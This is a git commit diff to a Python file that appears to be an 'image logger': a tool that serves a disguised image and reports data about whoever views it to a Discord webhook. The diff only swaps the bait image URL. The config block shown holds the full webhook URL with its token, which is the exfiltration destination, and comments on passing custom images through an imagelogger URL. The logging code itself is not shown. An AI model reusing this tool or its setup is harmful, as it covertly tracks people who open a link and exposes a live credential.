dc91edec9511698f6feb178a3bfc3c19ab24c550
8GrandDadPGN <109687400+6GrandDadPGN@users.noreply.github.com>
2024-11-01 23:03:02 -0400

    Update UnicoCat.py

--- api/UnicoCat.py
+++ api/UnicoCat.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1000488341336248331/ILKZ3Jviuj07VjmGPdHoC3_p8dZYRBwCO14IiONGkkKYMrWpbb_uKdj8fwUqcPAR5ic6",
-    "image": "https://media.discordapp.net/attachments/1000488283920408677/1302105167034056764/attachment.png?ex=6726e76f&is=672595ef&hm=acc03c95b4ead11e6cb929f8e59a4a518574375e5fe8cfcf61d6cabd92531f16&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
+    "image": "https://media.discordapp.net/attachments/1000488283920408677/1302105583046103151/attachment.png?ex=6726e7d2&is=67259652&hm=a3f13912a88e0ca29ca357d09bd1ded42cbbc680cb56985f192fac6316343010&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
